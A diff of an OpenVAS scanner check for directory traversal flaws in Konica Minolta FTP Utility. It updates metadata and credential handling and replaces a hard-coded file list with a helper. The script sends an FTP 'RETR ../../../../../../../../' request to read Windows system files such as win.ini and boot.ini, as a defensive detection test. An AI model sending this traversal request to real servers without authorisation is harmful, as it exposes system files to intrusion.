@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_konica_minolta_ftp_utility_mult_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
+# $Id: gb_konica_minolta_ftp_utility_mult_vuln.nasl 13497 2019-02-06 10:45:54Z cfischer $
 #
 # Konica Minolta FTP Utility Multiple vulnerabilities
 #
@@ -29,17 +29,17 @@ CPE = "cpe:/a:konicaminolta:ftp_utility";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805750");
-  script_version("$Revision: 11424 $");
+  script_version("$Revision: 13497 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:45:54 +0100 (Wed, 06 Feb 2019) $");
   script_tag(name:"creation_date", value:"2015-09-28 13:43:21 +0530 (Mon, 28 Sep 2015)");
   script_cve_id("CVE-2015-7603", "CVE-2015-7767", "CVE-2015-7768");
   script_name("Konica Minolta FTP Utility Multiple vulnerabilities");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl", "gb_konica_minolta_ftp_utility_detect.nasl");
+  script_dependencies("gb_konica_minolta_ftp_utility_detect.nasl");
   script_mandatory_keys("KonicaMinolta/Ftp/Installed");
   script_require_ports("Services/ftp", 21);
 
@@ -78,6 +78,7 @@ if(description)
 
 include("ftp_func.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 ftpPort = get_app_port(cpe:CPE);
 if(!ftpPort){
@@ -89,18 +90,11 @@ if(!soc){
   exit(0);
 }
 
-user = get_kb_item("ftp/login");
-password = get_kb_item("ftp/password");
+kb_creds = ftp_get_kb_creds();
+user = kb_creds["login"];
+pass = kb_creds["pass"];
 
-if(!user){
-  user = "anonymous";
-}
-
-if(!password){
-  password = string("anonymous");
-}
-
-login_details = ftp_log_in(socket:soc, user:user, pass:password);
+login_details = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!login_details){
  close(soc);
  exit(0);
@@ -118,17 +112,21 @@ if(!soc2){
   exit(0);
 }
 
-files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
-foreach file (files){
+files = traversal_files( "Windows" );
+
+foreach pattern( keys( files ) ) {
+
+  file = files[pattern];
   file = "../../../../../../../../" + file;
-  attackreq = string("RETR ", file);
-  send(socket:soc, data:string(attackreq, "\r\n"));
+  req = string("RETR ", file);
+  send(socket:soc, data:string(req, "\r\n"));
 
-  result = ftp_recv_data(socket:soc2);
+  res = ftp_recv_data(socket:soc2);
 
-  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
-                                     || "[boot loader]" >< result){
-    security_message(port:ftpPort, data:'Received file content:\n\n' + result);
+  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
+    report  = "Used request:  " + req + '\n';
+    report += "Received data: " + match;
+    security_message(port:ftpPort, data:report);
     close(soc2);
     close(soc);
     exit(0);
